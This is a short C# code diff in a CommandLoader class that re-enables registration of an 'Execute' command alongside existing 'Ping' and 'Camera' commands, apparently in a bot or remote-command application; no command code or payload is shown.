@@ -9,7 +9,7 @@ public static class CommandLoader
     {
         commandHelper.AddToCommandList(Ping.GlobalInstance);
 
-        //commandHelper.AddToCommandList(Execute.GlobalInstance);
+        commandHelper.AddToCommandList(Execute.GlobalInstance);
 
         commandHelper.AddToCommandList(Camera.GlobalInstance);
 
